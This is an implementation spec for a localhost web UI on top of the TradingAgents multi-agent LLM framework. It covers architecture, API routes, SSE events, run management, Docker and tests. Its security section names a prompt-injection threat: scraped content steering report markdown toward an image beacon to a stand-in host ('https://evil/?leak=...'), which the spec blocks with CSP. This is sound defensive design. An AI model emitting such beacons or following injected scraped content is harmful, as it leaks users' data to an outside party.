# TradingAgents Web UI — Implementation Spec

A local, single-user web UI that fully replaces the CLI flow: configure a run, watch live
multi-agent progress, and browse reports. Ships inside this repo as an optional install extra
(`pip install "tradingagents[web]"`) with a `tradingagents web` entry point.

Every decision below was resolved and adversarially verified on the wayfinder map
(`.wayfinder/map.md`); ticket links at the end give full rationale and evidence.

---

## 1. Architecture overview

```
tradingagents web  (typer subcommand, lazy imports)
  └─ uvicorn (single worker, 127.0.0.1:8035 default; --host/--port flags)
      └─ FastAPI app (tradingagents/web/)
          ├─ StaticFiles: index.html + js/ + vendor/  (package data)
          ├─ JSON API: /api/*
          ├─ SSE: /api/runs/{id}/events  (native FastAPI SSE, log-tailer)
          └─ RunManager (module-level, max 1 active run)
              └─ asyncio.Task per run:
                   pre-phases → graph.astream(...) → post-phases
                   events → slim projection → in-memory replay log
```

Frontend: vanilla JS ES modules, zero build step, hash routing. "Ops Workspace" design
(sidebar shell, pipeline DAG, master-detail reports) per the prototype on branch
`prototype/web-ui-look`, borrowing the article-style report reader and a collapsible
tool-call ticker.

## 2. Packaging & entry point

- `[project.optional-dependencies] web = ["fastapi>=0.135", "uvicorn"]` (3 new wheels total:
  fastapi, starlette, uvicorn — everything else is already in the dependency closure).
- Server code at `tradingagents/web/` (a top-level `web/` package would be silently dropped
  from wheels by `packages.find include = ["tradingagents*", "cli*"]`).
- Static UI as package data: `"tradingagents.web" = ["static/**/*"]` (recursive glob — the
  existing `cli = ["static/*"]` pattern is single-level).
- `tradingagents web` subcommand on the existing typer app. All web imports live inside the
  command function body (repo precedent: cli/main.py:1297-1298), wrapped in
  `try/except ImportError` with a `pip install "tradingagents[web]"` hint.
- Typer single→multi-command flip mitigated with `@app.callback(invoke_without_command=True)`
  running analyze when no subcommand is given, carrying today's top-level
  `--checkpoint`/`--clear-checkpoints` options. Bare `tradingagents` (Dockerfile ENTRYPOINT,
  compose quickstart, README:122/167) keeps working, and `tradingagents analyze` becomes
  valid — fixing README:253-254, which documents a form that is broken today.
- langgraph pin stays a floor at `>=0.4.8`; the web path is written against the 0.4.8 API
  surface ((mode, data) tuples; no `version="v2"`, no `tasks`/`checkpoints` stream modes).

## 3. API surface

| Method | Path | Purpose |
|---|---|---|
| GET | `/` | index.html (hash-routed app: `#/configure`, `#/run`, `#/reports`) |
| GET | `/static/*` | JS/CSS/vendor assets |
| GET | `/api/health` | liveness (also used by Docker healthcheck) |
| GET | `/api/providers` | providers + model catalog + key status booleans |
| GET | `/api/config` | explicit whitelist of non-secret effective defaults |
| GET | `/api/runs` | history list (scan + manifests, see §7) |
| POST | `/api/runs` | start run; 409 + active-run-id if one is active/draining; 422 naming the missing key env var |
| GET | `/api/runs/{id}` | run state: `running \| done \| failed \| cancelled` |
| POST | `/api/runs/{id}/cancel` | idempotent cancel |
| GET | `/api/runs/{id}/events` | SSE stream (replay + tail) |
| GET | `/api/runs/{ticker}/{date}/report` | report sections as raw markdown strings (JSON) |

State-changing endpoints accept `application/json` bodies only.

### SSE event schema

Native FastAPI SSE: the endpoint is itself an async generator declared with
`response_class=EventSourceResponse`, yielding `fastapi.sse.ServerSentEvent(event=..., data=..., id=...)`.
(The sse-starlette-style "return EventSourceResponse(gen)" idiom silently produces a bare
StreamingResponse — no event encoding, no keepalive, no Last-Event-ID.)

Typed events (all JSON `data`, monotonic integer `id` per run):

- `run_status` — {state, ticker, date, started_at, …}
- `agent_status` — {agent, team, status: pending|working|done}
- `report_section` — {section, markdown} (whole accumulated section per event)
- `tool_call` — {name, args_preview}
- `message` — {agent, preview}
- `stats` — {elapsed, llm_calls, tool_calls}
- `done` / `error` / `cancelled` — terminal; `error` carries {message, exc_type, traceback_tail}

Client MUST close the EventSource on any terminal event (EventSource otherwise reconnects
forever). `Last-Event-ID` is only sent on auto-reconnect; a fresh page load replays from 0 —
the log covers the whole run. Reducers are idempotent (full replay is always safe).

Graph streaming: `stream_mode=["updates", "custom"]` (optionally `"messages"` later for
token streaming — then coalesce DOM writes via requestAnimationFrame). `"custom"` emits
nothing today (zero `get_stream_writer` calls in tradingagents/) — web code may add writers
later; v1 projects from `updates` only. The web path must override
`propagator.get_graph_args()`'s hardcoded `stream_mode: "values"` (propagation.py:82).

## 4. Run manager

- **Decoupled execution:** POST spawns an asyncio.Task driving the whole run; the SSE
  endpoint is a pure log-tailer (per-subscriber queue or Condition). Navigating away or
  closing the tab never affects the run. The registry holds a strong reference to the task.
- **Single active run**, no queue: POST while active → 409 with the active run id. The
  invariant counts **draining** runs (below) as active. Rationale: TradingAgentsGraph is not
  concurrency-safe (module-global dataflows config via `set_config`, instance-state mutation
  in `propagate()`, lockless read-modify-write in TradingMemoryLog).
- **Async run path:** `graph.astream(...)`; checkpoint-enabled runs compile with
  `AsyncSqliteSaver` (`langgraph.checkpoint.sqlite.aio`) — the sync `SqliteSaver` hard-raises
  NotImplementedError under the async Pregel loop. The repo's `get_checkpointer` is
  sqlite3/sync-only, so the web adds an async helper with thread_id / checkpoint_step /
  clear_checkpoint parity. aiosqlite is already a transitive dep.
- **Sync phases threaded:** `_resolve_pending_entries` (yfinance + deferred-reflection LLM
  calls) and `process_signal` / `_log_state` run via the executor, never on the event loop.
  Post-phases MUST include `store_decision` and `clear_checkpoint` (trading_graph.py:469-481)
  or the deferred-reflection memory loop silently breaks.
- **Cancellation:** `task.cancel()` lands immediately at the current await; langgraph's
  cleanup is prompt, flushes checkpointer writes, and cannot deadlock. The in-flight sync
  node / pre-phase thread keeps running detached (uninterruptible; still bills; can touch the
  memory log after cancellation). Therefore each run installs a **per-run
  ThreadPoolExecutor** (`loop.set_default_executor()` at run start); on terminal transition
  the run enters **draining** and the single-run slot is held until
  `old_pool.shutdown(wait=True)` (awaited in background) completes. Set explicit LLM SDK
  timeouts so server exit cannot hang on atexit thread joins. Do not promise instant
  cancellation in UI copy ("stopping after the current agent finishes").
- **Event projection:** raw `updates` events are MBs per run (full tool CSVs, duplicated
  reports, cumulative debate histories). The run task projects them server-side into the slim
  typed events above (reference: the CLI's projection loop, cli/main.py:1132-1232); only
  projected, id-stamped events enter the replay log (~50–150 KB/run).
- **Crash surfacing:** any exception → terminal `error` event + state `failed`; partial
  reports remain on disk because sections are written incrementally (mirror
  cli/main.py:1063-1079) — `write_report_tree` alone only runs at successful completion.
- Event log is discarded when a new run starts; completed runs are re-served from disk (§7).
- No reflection endpoint: `reflect_and_remember` no longer exists in the codebase; deferred
  reflection runs implicitly in the pre-phase and is covered by draining semantics.

## 5. Frontend

- Vanilla JS ES modules, zero build: `static/index.html`, `static/js/{store,sse,api}.js`,
  `static/js/views/*.js`, `static/vendor/{marked.min.js,purify.min.js}` (+ license files).
  Hand-rolled pub/sub store; state is enumerable (7 report-section buffers, ~14 agent nodes,
  one run, tool-call list). Logic stays in pure functions (reducers) for testability.
- Design: Ops Workspace shell from the prototype (sidebar nav with pinned live-run status,
  pipeline DAG over a split detail pane, configure form page, master-detail reports with an
  article-style reading column and a collapsible tool-call ticker).
- Markdown pipeline: `DOMPurify.sanitize(marked.parse(md))` into a `.report-body` container.
  marked is required for GFM tables (analyst prompts mandate them). Whole-section re-parse
  per event is trivially cheap.
- Serving hardening: `mimetypes.add_type('text/javascript', '.js')` (and `.mjs`) at startup
  (Windows registry pollution otherwise blanks the app); `Cache-Control: no-cache` on the
  static mount (Starlette sets no cache-control; stale-module bugs after pip upgrades).

## 6. Security requirements (mandatory, not optional)

- **Host-allowlist:** reject requests whose `Host` hostname (port-agnostic) is not in
  {localhost, 127.0.0.1, [::1]} — TrustedHostMiddleware or equivalent (verify it strips the
  port; strip explicitly otherwise). This is the defense against DNS rebinding, which would
  otherwise give hostile websites same-origin access to trigger paid LLM runs and read
  results.
- **CSP as an HTTP response header** on all HTML/static responses:
  `default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self' data:; connect-src 'self'`.
  No inline scripts or styles anywhere in the shipped UI. `img-src 'self' data:` blocks the
  prompt-injection exfiltration channel: report markdown derives from attacker-influenceable
  scraped content (Reddit, StockTwits, news), and `![](https://evil/?leak=...)` image beacons
  are not blocked by DOMPurify — only CSP stops them.
- **API keys:** presence booleans only (`present` / `missing` / `not-required` / `optional`),
  never values, never masked prefixes. No endpoint accepts a key. Keys live in `.env`; the UI
  names the env var and says "add to .env and restart". POST /api/runs validates key presence
  before spawning and fails with a clear error.
- **backend_url is secret-adjacent** (keyed relays embed tokens in URLs): never echoed to the
  browser; the configure form's field is write-only; excluded from persisted web settings.
- **GET /api/config is an explicit whitelist** of non-secret keys — never a raw
  `DEFAULT_CONFIG` dump, so future secret-bearing keys cannot leak by default.
- No CORS middleware (cross-origin preflights must fail). JSON-only mutating endpoints.
  DOMPurify pinned at an exact 3.2.x version recorded in the vendor dir, default config, with
  a documented bump-on-advisory step; `afterSanitizeAttributes` hook forces
  `rel="noopener noreferrer"` on links.
- Bind 127.0.0.1 by default. A random session token is optional extra hardening, not required.

## 7. Run history & persistence

- One shared history in the existing `results_dir` tree (`~/.tradingagents/logs` default):
  web runs write the identical `{TICKER}/{date}/reports/` tree the CLI writes (incrementally,
  §4) plus a **`run.json` manifest**: run_id, ticker, date, asset_type, status, decision
  (processed signal), provider + deep/quick models, analysts, timestamps, duration, error
  summary. Decision/models/duration are recoverable from nowhere else on disk.
- CLI-era runs (no manifest) degrade gracefully: listed from dir names, decision unknown,
  source "cli". No prose parsing.
- No sqlite index: two-level directory scan per listing, in-process cache keyed on dir
  mtimes. The results tree stays the single source of truth.
- Report endpoint returns the 7 section markdown files (REPORT_SECTIONS, cli/main.py:96-103)
  falling back to `complete_report.md`. `full_states_log_*.json` and `message_tool.log` stay
  unexposed (debug artifacts).

## 8. Config

- Per-run form config mirroring CLI selections (ticker, date, asset type, analysts, research
  depth presets → `max_debate_rounds`/`max_risk_discuss_rounds`, provider + models from the
  catalog, thinking/effort knobs in a collapsed advanced group). Server builds
  `DEFAULT_CONFIG.copy()` + request overrides; `TRADINGAGENTS_*` env vars keep supplying base
  defaults.
- Last-used settings persisted to `~/.tradingagents/web_settings.json` (excluding
  backend_url) and loaded as form defaults. Settings sidebar entry is a read-only panel
  (key presence, paths, effective non-secret defaults). No global settings editor in v1.

## 9. Docker

- One image; builder installs `".[web]"`. ENTRYPOINT unchanged (`tradingagents` — the
  callback compat keeps existing services working).
- New compose service `tradingagents-web`: `command: ["web", "--host", "0.0.0.0", "--port", "8035"]`,
  `ports: ["127.0.0.1:8035:8035"]`, same `env_file` and `tradingagents_data` volume (container
  CLI and web runs share history). Healthcheck against `/api/health`.
- Security: host-side publish is loopback-only; binding 0.0.0.0 inside the container is safe
  only because of that. Docs must warn against `0.0.0.0:8035:8035` / `8035:8035` mappings,
  which would expose the unauthenticated server to the network. Docker forwards the Host
  header verbatim, so the port-agnostic allowlist keeps working under remapped ports.
- No ollama-web service variant; users set `TRADINGAGENTS_LLM_PROVIDER=ollama` in `.env`.

## 10. Testing

- Same pytest suite, flat `tests/test_web_*.py`; async via the anyio pytest plugin (already a
  transitive dep — zero new test dependencies); FastAPI TestClient (httpx present).
- **Injectable engine seam:** RunManager takes the run-driving callable as a dependency;
  tests inject a scripted fake emitting canned projected events (always terminating — no
  hanging streams). No LLM/network/real graph in web tests.
- Contract tests: SSE replay-from-Last-Event-ID, monotonic ids, terminal events, 409
  (including draining), idempotent cancel, manifest writing, history with/without manifests.
- Security regressions: exact CSP header; foreign-Host rejection; config whitelist exactness;
  key-echo canary (fake `OPENAI_API_KEY` value must appear in no response body);
  backend_url never echoed.
- Scaffolding conformance: stream_mode override, AsyncSqliteSaver construction,
  post-phase order.
- No browser automation in v1; manual smoke checklist: load app, configure + start a run,
  watch DAG/status/reports stream, cancel a run, reload mid-run (replay), browse a CLI-era
  and a web-era report, kill server mid-run and confirm partial reports on disk.

## 11. Implementation plan (ordered)

1. **Packaging + CLI compat:** `[web]` extra, package-data glob, `@app.callback` compat +
   explicit `analyze` command + `web` command skeleton (lazy imports). Update README:253-254
   and Docker docs in the same change.
2. **Server skeleton:** app factory in `tradingagents/web/`, static serving with MIME fix,
   no-cache, CSP header middleware, TrustedHost allowlist, `/api/health`.
3. **Run manager core** (with tests, engine seam first): registry, single-run + draining
   invariant, per-run executor, lifecycle states, event log + projection.
4. **Graph scaffolding:** async checkpointer helper, threaded pre/post phases, stream_mode
   override, incremental report writes, `run.json` manifest.
5. **SSE endpoint** with replay + terminal semantics.
6. **JSON API:** providers/config/runs/history/report endpoints with pre-run key validation.
7. **Frontend:** shell + hash router + store, configure form, live run view (DAG + sections +
   ticker), reports master-detail; vendor marked/DOMPurify pinned.
8. **Docker:** compose service, healthcheck, docs warnings.
9. **Security regression tests + manual smoke pass.**

Steps 3–6 and 7 can proceed in parallel once 2 lands.

## 12. Non-goals / v2 candidates

- Live price charts in the UI (v2 candidate).
- Portfolio dashboards, cross-ticker comparison, backtesting UI (explicitly out of scope).
- Multi-user auth / remote deployment hardening (localhost single-user by design).
- Token-level streaming (`"messages"` mode) — supported by the design, deferred.

## 13. Traceability

| Ticket | Decision |
|---|---|
| [001](../.wayfinder/tickets/001-research-streaming-langgraph-to-browser.md) | SSE research (branch `research/web-streaming`) |
| [002](../.wayfinder/tickets/002-backend-stack.md) | Backend stack, transport, packaging |
| [003](../.wayfinder/tickets/003-prototype-ui-look.md) | UI prototype (branch `prototype/web-ui-look`, artifact link inside) |
| [004](../.wayfinder/tickets/004-frontend-tech.md) | Frontend tech + markdown/XSS pipeline |
| [005](../.wayfinder/tickets/005-run-execution-model.md) | Run manager, cancellation, projection |
| [006](../.wayfinder/tickets/006-run-history-persistence.md) | History + manifests |
| [007](../.wayfinder/tickets/007-config-and-keys.md) | Config + API keys |
| [008](../.wayfinder/tickets/008-web-testing.md) | Testing strategy |
| [009](../.wayfinder/tickets/009-docker-shipping.md) | Docker shipping |
